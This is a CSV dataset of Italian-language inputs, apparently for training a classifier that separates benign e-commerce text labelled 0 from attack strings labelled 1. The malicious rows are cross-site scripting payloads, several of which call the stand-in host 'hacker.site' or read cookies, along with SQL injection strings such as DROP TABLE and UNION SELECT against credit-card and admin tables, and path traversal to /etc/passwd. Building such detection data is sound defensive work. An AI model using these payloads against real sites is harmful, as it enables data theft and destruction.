testo,etichetta
cerco zaino rosso taglia S,0
<script>alert('pwned')</script>,1
compra orologio online in offerta,0
..%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""fetch('http://hacker.site')"">",1
../../../etc/passwd,1
../../../../etc/passwd,1
"Via Garibaldi 101, Firenze",0
../../../../../../etc/passwd,1
<details open ontoggle=alert(1)>,1
../../../etc/passwd,1
"<svg onload=""alert('pwned')"">",1
../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
'; DROP TABLE utenti; --,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
cerco maglietta blu taglia S,0
'; DROP TABLE config; --,1
cerco scarpe bianco taglia 42,0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
../../../../../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"<svg onload=""alert('pwned')"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""alert('pwned')"">",1
../../../../../../../../etc/passwd,1
compra giacca online in offerta,0
../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
"<svg onload=""alert(document.cookie)"">",1
<script>alert('pwned')</script>,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE clienti; --,1
"<svg onload=""alert('pwned')"">",1
../../../../../../../../etc/passwd,1
"Via Milano 80, Firenze",0
<script>fetch('http://hacker.site')</script>,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
cerco giacca rosso taglia 42,0
compra pantaloni online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM admin --,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
<script>fetch('http://hacker.site')</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>fetch('http://hacker.site')</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>fetch('http://hacker.site')</script>,1
'; DROP TABLE sessions; --,1
..%2f%2f%2f%2fvar/www/html/config.php,1
<script>fetch('http://hacker.site')</script>,1
cerco scarpe bianco taglia S,0
'; DROP TABLE carte_credito; --,1
../../../etc/passwd,1
../../../../../../etc/passwd,1
cerco maglietta nero taglia 44,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Mazzini 70, Firenze",0
"<svg onload=""fetch('http://hacker.site')"">",1
"SELECT * FROM tabella WHERE id = 1 AND (SELECT BENCHMARK(5000000,MD5(1)))",1
"<svg onload=""fetch('http://hacker.site')"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""alert('pwned')"">",1
'; DROP TABLE sessions; --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"Corso Italia 235, Firenze",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Garibaldi 245, Roma",0
"<svg onload=""fetch('http://hacker.site')"">",1
../../../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
cerco zaino bianco taglia 42,0
'; DROP TABLE config; --,1
compra felpa online in offerta,0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
compra maglietta online in offerta,0
../../../etc/passwd,1
caffè in grani arabica,0
SELECT * FROM users WHERE username = 'admin' AND password = '1' OR '1'='1',1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
compra giacca online in offerta,0
"Via Dante 118, Bologna",0
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"Via Mazzini 163, Firenze",0
'; DROP TABLE config; --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
"Via Dante 112, Bologna",0
"Via Mazzini 58, Bologna",0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
../../../../etc/passwd,1
"<svg onload=""fetch('http://hacker.site')"">",1
<script>alert('pwned')</script>,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
compra giacca online in offerta,0
<script>alert('pwned')</script>,1
"<svg onload=""fetch('http://hacker.site')"">",1
compra giacca online in offerta,0
../../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR '1'='1,1
<script>alert(document.cookie)</script>,1
'; DROP TABLE admin; --,1
"<svg onload=""alert('pwned')"">",1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
../../../../../../etc/passwd,1
compra felpa online in offerta,0
"<svg onload=""fetch('http://hacker.site')"">",1
'; DROP TABLE sessions; --,1
..%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
'; DROP TABLE config; --,1
<script>alert(document.cookie)</script>,1
../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
"' OR json_extract(config, '$.admin') = 1 --",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""alert(document.cookie)"">",1
..%2f%2f%2fvar/www/html/config.php,1
compra felpa online in offerta,0
compra scarpe online in offerta,0
..%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert(document.cookie)</script>,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert(document.cookie)"">",1
../../../../../etc/passwd,1
compra orologio online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM admin --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
'; DROP TABLE admin; --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Milano 233, Palermo",0
cerco felpa verde taglia L,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
cerco giacca rosso taglia 43,0
../../../../../../etc/passwd,1
"Via Roma 62, Bologna",0
"Via Milano 39, Genova",0
../../../../../../../../etc/passwd,1
'; DROP TABLE clienti; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
giulia.verdi@outlook.it,0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert(document.cookie)</script>,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE carte_credito; --,1
<script>fetch('http://hacker.site')</script>,1
compra felpa online in offerta,0
<script>fetch('http://hacker.site')</script>,1
<script>alert(document.cookie)</script>,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
'; DROP TABLE sessions; --,1
cerco scarpe verde taglia 43,0
"<svg onload=""alert(document.cookie)"">",1
cerco pantaloni bianco taglia S,0
1' OR 'a'='a' UNION SELECT * FROM admin --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
recupero password account,0
../../../../../../../etc/passwd,1
../../../../../etc/passwd,1
compra giacca online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
compra giacca online in offerta,0
compra scarpe online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
"<svg onload=""alert('pwned')"">",1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
"<svg onload=""alert('pwned')"">",1
"Corso Italia 244, Bologna",0
